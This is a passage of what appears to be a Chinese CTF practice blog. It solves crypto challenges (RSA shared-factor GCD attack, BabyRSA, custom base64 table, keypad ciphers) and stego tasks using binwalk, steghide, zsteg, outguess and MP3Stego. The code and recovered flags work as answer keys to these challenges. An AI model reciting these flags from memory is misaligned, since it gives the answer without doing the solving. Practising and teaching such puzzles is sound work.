6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006n9 = 23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941c9 = 5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934n10 = 28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491c10 = 9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869n11 = 22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019c11 = 1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467n12 = 27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299c12 = 21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971n13 = 20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551c13 = 14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175n14 = 27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987c14 = 3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457n15 = 27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837c15 = 14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842n16 = 25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451c16 = 17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724n17 = 23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499c17 = 10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024n18 = 19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973c18 = 3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887n19 = 19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603c19 = 6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889n20 = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659c20 = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346list=[n1,n2,n3,n4,n5,n6,n7,n8,n9,n10,n11,n12,n13,n14,n15,n16,n17,n18,n19,n20]for i in range(len(list)): for j in range(len(list)): print i,j try: print (gcd(list[i],list[j])) except: print &quot;error &quot;,i continue 得到第5和第18个n有最大公约数，即p 1132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499 计算得到q 1147764243536346715659432105628869451579704787136671496082719136693967862981444027430286693715470058237766749929595449234542432638995582675309345203650862074805309250048791833572328389815134763390112740125416594657830110772787259287349943894208620126222405887247024583782974900764827221144394822451457152873527 求d 1234e=65537phi=(p-1)*(q-1)d=gmpy2.invert(e,phi)print d 求c 123456789t=p*qlist=[c,c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,c16,c17,c18,c19]for i in range(len(list)): print i try: print (pow(list[i],d,t)) except: print &quot;error &quot;,i continue 传感器5555555595555A65556AA696AA6666666955 这是某压力传感器无线数据包解调后但未解码的报文(hex) 已知其ID为0xFED31F，请继续将报文完整解码，提交hex。 提示1：曼联 12345678910111213a=&quot;5555555595555A65556AA696AA6666666955&quot;b=int(a,16)c=bin(b)[2:]flag=&quot;&quot;steady_flag=&quot;&quot;for i in range(0,len(c),2): steady=c[i:i+2] if steady==&#x27;01&#x27;: flag+=str(1) elif steady==&#x27;10&#x27;: flag+=str(0)print(hex(int(flag)))#print十六进制 但是与原ID不一样。尝试将二进制反转。 123456789101112131415161718192021#最终直接转化字符串，一定要注意二进制数据是四的倍数。a&#x3D;&quot;5555555595555A65556AA696AA6666666955&quot;b&#x3D;int(a,16)c&#x3D;&#39;0&#39;+bin(b)[2:]flag&#x3D;&quot;&quot;steady_flag&#x3D;&quot;&quot;for i in range(0,len(c),4): steady&#x3D;c[i:i+4] print(steady) if steady&#x3D;&#x3D;&#39;0101&#39;: flag+&#x3D;str(&#39;11&#39;) elif steady&#x3D;&#x3D;&#39;1001&#39;: flag+&#x3D;str(&#39;01&#39;) elif steady&#x3D;&#x3D;&#39;0110&#39;: flag+&#x3D;str(&#39;10&#39;) elif steady&#x3D;&#x3D;&#39;1010&#39;: flag+&#x3D;str(&#39;00&#39;)for i in range(0,len(flag),8): steady_flag+&#x3D;hex(int(flag[i:i+8][::-1],2))[2:]print(steady_flag)#采用第二种编码方式，并且需要将二进制数据每八位逆序。然后转换十六进制。 最后拿到十六进制fffffed31f645055f9。 [GUET-CTF2019]BabyRSA1234567891011import gmpy2p_and_q = 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2eap_1_q_1 = 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740e = 0xe6b1bee47bd63f615c7d0a43c529d219d = 0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5enc_flag = 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9an = p_1_q_1 - p_and_q - 1plain = gmpy2.powmod(enc_flag,d,n)print hex(plain)[2:].decode(&#x27;hex&#x27;) 密码学的心声所有数字都小于8，考虑八进制组合，3个一组，得出flag。 1234567s = &#x27;111 114 157 166 145 123 145 143 165 162 151 164 171 126 145 162 171 115 165 143 150&#x27;tmp = [s.split(&#x27; &#x27;)[i] for i in range(len(s.split(&#x27; &#x27;)))]cipher = &#x27;&#x27;for i in tmp: cipher += chr(int(i,8))flag = &quot;flag&#123;&quot;+cipher+&quot;&#125;&quot;print(flag) rot先将数字减去13，然后在转字符串。 123456789101112steady_str=&quot;83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112&quot;steady_str=steady_str.split(&quot; &quot;)flag=&quot;&quot;for i in steady_str: flag+=str(int(i)-13)for i in range(0,len(flag),2): print(flag[i:i+2])steady_str=&quot;70 76 65 71 32 73 83 32 102 108 97 103 123 119 119 119 95 115 104 105 121 97 110 98 97 114 95 99 111 109 95 105 115 95 118 101 114 121 95 103 111 111 100 95 63 63 63 63 125 10 77 68 53 58 51 56 101 52 99 51 53 50 56 48 57 101 49 53 48 49 56 54 57 50 48 97 97 99 51 55 49 57 48 99 98 99&quot;steady_list=steady_str.split(&quot; &quot;)for i in steady_list: flag+=chr(int(i))print(flag) 结果： 12FLAG IS flag&#123;www_shiyanbar_com_is_very_good_????&#125;MD5:38e4c352809e150186920aac37190cbc 最后md5破解，拿到flag。 [BJDCTF2020]这是base??base64表给换掉了。 1234dict:&#123;0: &#x27;J&#x27;, 1: &#x27;K&#x27;, 2: &#x27;L&#x27;, 3: &#x27;M&#x27;, 4: &#x27;N&#x27;, 5: &#x27;O&#x27;, 6: &#x27;x&#x27;, 7: &#x27;y&#x27;, 8: &#x27;U&#x27;, 9: &#x27;V&#x27;, 10: &#x27;z&#x27;, 11: &#x27;A&#x27;, 12: &#x27;B&#x27;, 13: &#x27;C&#x27;, 14: &#x27;D&#x27;, 15: &#x27;E&#x27;, 16: &#x27;F&#x27;, 17: &#x27;G&#x27;, 18: &#x27;H&#x27;, 19: &#x27;7&#x27;, 20: &#x27;8&#x27;, 21: &#x27;9&#x27;, 22: &#x27;P&#x27;, 23: &#x27;Q&#x27;, 24: &#x27;I&#x27;, 25: &#x27;a&#x27;, 26: &#x27;b&#x27;, 27: &#x27;c&#x27;, 28: &#x27;d&#x27;, 29: &#x27;e&#x27;, 30: &#x27;f&#x27;, 31: &#x27;g&#x27;, 32: &#x27;h&#x27;, 33: &#x27;i&#x27;, 34: &#x27;j&#x27;, 35: &#x27;k&#x27;, 36: &#x27;l&#x27;, 37: &#x27;m&#x27;, 38: &#x27;W&#x27;, 39: &#x27;X&#x27;, 40: &#x27;Y&#x27;, 41: &#x27;Z&#x27;, 42: &#x27;0&#x27;, 43: &#x27;1&#x27;, 44: &#x27;2&#x27;, 45: &#x27;3&#x27;, 46: &#x27;4&#x27;, 47: &#x27;5&#x27;, 48: &#x27;6&#x27;, 49: &#x27;R&#x27;, 50: &#x27;S&#x27;, 51: &#x27;T&#x27;, 52: &#x27;n&#x27;, 53: &#x27;o&#x27;, 54: &#x27;p&#x27;, 55: &#x27;q&#x27;, 56: &#x27;r&#x27;, 57: &#x27;s&#x27;, 58: &#x27;t&#x27;, 59: &#x27;u&#x27;, 60: &#x27;v&#x27;, 61: &#x27;w&#x27;, 62: &#x27;+&#x27;, 63: &#x27;/&#x27;, 64: &#x27;=&#x27;&#125;chipertext:FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw 1234567891011121314// An highlighted blockimport base64dict=&#123;0: &#x27;J&#x27;, 1: &#x27;K&#x27;, 2: &#x27;L&#x27;, 3: &#x27;M&#x27;, 4: &#x27;N&#x27;, 5: &#x27;O&#x27;, 6: &#x27;x&#x27;, 7: &#x27;y&#x27;, 8: &#x27;U&#x27;, 9: &#x27;V&#x27;, 10: &#x27;z&#x27;, 11: &#x27;A&#x27;, 12: &#x27;B&#x27;, 13: &#x27;C&#x27;, 14: &#x27;D&#x27;, 15: &#x27;E&#x27;, 16: &#x27;F&#x27;, 17: &#x27;G&#x27;, 18: &#x27;H&#x27;, 19: &#x27;7&#x27;, 20: &#x27;8&#x27;, 21: &#x27;9&#x27;, 22: &#x27;P&#x27;, 23: &#x27;Q&#x27;, 24: &#x27;I&#x27;, 25: &#x27;a&#x27;, 26: &#x27;b&#x27;, 27: &#x27;c&#x27;, 28: &#x27;d&#x27;, 29: &#x27;e&#x27;, 30: &#x27;f&#x27;, 31: &#x27;g&#x27;, 32: &#x27;h&#x27;,33: &#x27;i&#x27;, 34: &#x27;j&#x27;, 35: &#x27;k&#x27;, 36: &#x27;l&#x27;, 37: &#x27;m&#x27;, 38: &#x27;W&#x27;, 39: &#x27;X&#x27;, 40: &#x27;Y&#x27;, 41: &#x27;Z&#x27;, 42: &#x27;0&#x27;, 43: &#x27;1&#x27;, 44: &#x27;2&#x27;, 45: &#x27;3&#x27;, 46: &#x27;4&#x27;, 47: &#x27;5&#x27;, 48: &#x27;6&#x27;, 49: &#x27;R&#x27;, 50: &#x27;S&#x27;, 51: &#x27;T&#x27;, 52: &#x27;n&#x27;, 53: &#x27;o&#x27;, 54: &#x27;p&#x27;, 55: &#x27;q&#x27;, 56: &#x27;r&#x27;, 57: &#x27;s&#x27;, 58: &#x27;t&#x27;, 59: &#x27;u&#x27;, 60: &#x27;v&#x27;, 61: &#x27;w&#x27;, 62: &#x27;+&#x27;, 63: &#x27;/&#x27;, 64: &#x27;=&#x27;&#125;base64_list = [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;,&#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;,&#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;,&#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;+&#x27;, &#x27;/&#x27;]cipher=&#x27;FlZNfnF6Qol6e9w17WwQQoGYBQCgIkGTa9w3IQKw&#x27;res=&#x27;&#x27;for i in range(len(cipher)): for j in range(64): if(dict[j]==cipher[i]): res+=base64_list[j]print(res)flag=base64.b64decode(res)print(flag)#b&#x27;BJD&#123;D0_Y0u_kNoW_Th1s_b4se_map&#125;&#x27; [NCTF2019]Keyboard提示键盘 1ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee 本想着是键盘密码，但是发现好多重复的，想到手机键盘，尝试python解密。 123456strr = &quot;ooo yyy ii w uuu ee uuuu yyy uuuu y w uuu i i rr w i i rr rrr uuuu rrr uuuu t ii uuuu i w u rrr ee www ee yyy eee www w tt ee&quot;.split()all = &#123;&#x27;none1&#x27;:&#x27;&#x27;,&#x27;none2&#x27;:&#x27;&#x27;,&#x27;w&#x27;:&#x27;abc&#x27;,&#x27;e&#x27;:&#x27;def&#x27;,&#x27;r&#x27;:&#x27;ghi&#x27;,&#x27;t&#x27;:&#x27;jkl&#x27;,&#x27;y&#x27;:&#x27;mno&#x27;,&#x27;u&#x27;:&#x27;pors&#x27;,&#x27;i&#x27;:&#x27;tuv&#x27;,&#x27;o&#x27;:&#x27;wxyz&#x27;&#125;flag=&quot;&quot;for i in strr: flag+=all[i[0]][len(i)-1]print(flag) [MRCTF2020]keyboard重复的次数就是每个键盘上的字母。 123456789101112131415得到的flag用MRCTF&#123;xxxxxx&#125;形式上叫都为小写字母66662244455533744666663","categories":[{"name":"CTF-密码","slug":"CTF-密码","permalink":"http://s1eady.top/categories/CTF-%E5%AF%86%E7%A0%81/"}],"tags":[{"name":"CTF-密码","slug":"CTF-密码","permalink":"http://s1eady.top/tags/CTF-%E5%AF%86%E7%A0%81/"}]},{"title":"CTF-杂项刷题2","slug":"CTF-杂项刷题1","date":"2019-05-15T18:20:17.000Z","updated":"2020-11-15T09:59:58.760Z","comments":true,"path":"2019/05/16/CTF-杂项刷题1/","link":"","permalink":"http://s1eady.top/2019/05/16/CTF-%E6%9D%82%E9%A1%B9%E5%88%B7%E9%A2%981/","excerpt":"","text":"中国移动音频隐写SYN01 powpow拿到一个mp4文件，首先想到分帧。 1ffmpeg -i flag.mp4 -f image2 image%d.jpg 拿到200+图片，但是查看图片没有什么异常，查看文件属性，有一串base64，解密： 1http:&#x2F;&#x2F;steghide.sourceforge.net&#x2F; 提示steghide，但是该工具只能使用jpg，想到分离出来的jpg，但是文件太多也不现实。直接binwalk分析MP4 文件。 藏有一个png，使用工具将png转化为jpg，然后使用steghide，密码为password。 123stepic -d -i image.png &gt; image.jpgsteghide extract -sf image.jpg -p passwordwrote extracted data to &quot;base64.txt&quot; python base85拿到flag。 SYN03 binwalk提示binwalk，直接分离分离出两张图片，盲水印、compare、stegsolve都试过了，然后最后zsteg拿到flag。 1234b8,bgr,msb,yX,prime .. text: &quot;~r0&gt;2Paj()z&quot;b1,r,lsb,xY .. text: &quot;ISG&#123;E4sY_StEg4n0gR4pHy&#125;&quot;b2,r,lsb,xY .. text: &quot;&gt;PUUUUUUUU&quot;b2,g,msb,xY .. file: BIOS (ia32) ROM Ext. (252*512) 可以看到在r的0通道拿到flag。所以直接stegsolve的data extract。 SYN02 Easy_stegano拿到一个gif，本能的分离，分离出三张图片发现没有太大的信息。直接binwalkgif。分理处一个压缩包，解压一共六个文件。 12steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ ls1.png 2.jpg 3.jpg 4.jpg 5.jpg 6.jpg strange_file.png 挨个文件查看。 第一个，在文件的最后： 12345steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings 1.png tvUZIHDQIENDLets begin:3tKdX 第二个提示另一种方式，使用outguess， 12345steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings 2.jpgDi$60WM(&amp;Dont be stupidUse another method 123456steady@steady:~/桌面/steady/1$ outguess -r 2.jpg out &amp;&amp; cat outReading 2.jpg....Extracting usable bits: 2315 bitsSteg retrieve: seed: 32, len: 16N0LWFDont stop 第三章图片，查看有PK字段，binwalk分离， 1234567steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings 3.jpg994PK995PK996PK997PK998PK999PK 拿到许多文件，文件都在压缩包内，查看CRC是不是有不同的，其中一个名字为386的文件的CRC与别的不一样。也可以计算文件的md5，可以看到文件386的md5与其他文件不一样。 1steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;zip&#x2F;_3.jpg.extracted$ md5sum * | sort -k1 12steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;368GoOd 3RlZ30&#x3D; 第四个exitfool工具, 12345678910111213141516171819202122232425262728steady@steady:~/桌面/steady/1$ exiftool /home/steady/桌面/steady/1/4.jpgExifTool Version Number : 12.07File Name : 4.jpgDirectory : /home/steady/桌面/steady/1File Size : 6.9 kBFile Modification Date/Time : 2015:01:18 21:14:24+08:00File Access Date/Time : 2020:11:03 14:23:47+08:00File Inode Change Date/Time : 2020:11:03 14:23:45+08:00File Permissions : rwxrw-rw-File Type : JPEGFile Type Extension : jpgMIME Type : image/jpegJFIF Version : 1.01Resolution Unit : NoneX Resolution : 1Y Resolution : 1Exif Byte Order : Little-endian (Intel, II)#flagArtist : If you insist here is your gift: ZmxhZComment : Image Width : 187Image Height : 186Encoding Process : Baseline DCT, Huffman codingBits Per Sample : 8Color Components : 3Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2)Image Size : 187x186Megapixels : 0.035 第五个， 123456steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1&#x2F;5.jpg&#x3D;Bvz;&#x3D;Bvz9!Y$So easyJust Look Carefully 仔细看图片图片上有TaU1w。 第六个， 1234steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;1$ strings &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1&#x2F;6.jpgHere is your last giftTGUtUNow form the flag :) 最后把字符串组成一组。 1[&quot;3tKdX&quot;,&quot;N0LWF&quot;,&quot;ZmxhZ&quot;,&quot;TaU1w&quot;,&quot;TGUtU&quot;，&quot;3RlZ30&#x3D;&quot;] 组合起来是3tKdXN0LWF3RlZ30=ZmxhZTGUtU，不是一个正常的base64，想到栅栏，把=号移动到最后面但是最终还是没拿到flag。观察这几串字符，被分成几块，而且=号这一块一定是在最后面的，所以flag很可能就是这几个块随机组合。所以上python脚本。 1234567import itertoolsfrom base64 import b64decoded = [&quot;3tKdX&quot;,&quot;N0LWF&quot;,&quot;ZmxhZ&quot;,&quot;TaU1w&quot;,&quot;TGUtU&quot;]for x in itertools.permutations(d): print(b64decode(&#x27;&#x27;.join(x) + &quot;3RlZ30=&quot;)) 1python3 &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1&#x2F;1.py | grep &quot;flag&quot; 最后拿到flag。 slowed题目提示slow，打开之后听音乐，发现很慢，使用sox变快一点steady@steady:~/桌面/steady$ sox slowed.wav fast.wav speed 3.2。 听到了字母的语音。使用Audacity查看频谱图，发现频谱图中有数据，通过修改频率也是看不清，直接使用sox。 1sox slowed.wav -n spectrogram 可以看到不太清楚，直接使用sox再次优化。 1sox slowed.wav -n spectrogram -z 30 -Z -20 -x 1600 最后拿到一个下载地址。 其他隐写FRA05 syclovergeekMP3隐写，文件名字就是密码。 1234567891011121314C:\\Users\\12521\\Desktop\\CTFTools\\信息隐藏\\MP3Stego_1_1_18\\MP3Stego&gt;MP3StegoDecode.exe -X -P syclovergeek C:\\Users\\12521\\Desktop\\syclovergeek.mp3MP3StegoEncoder 1.1.17See README file for copyright infoInput file = &#x27;C:\\Users\\12521\\Desktop\\syclovergeek.mp3&#x27; output file = &#x27;C:\\Users\\12521\\Desktop\\syclovergeek.mp3.pcm&#x27;Will attempt to extract hidden information. Output: 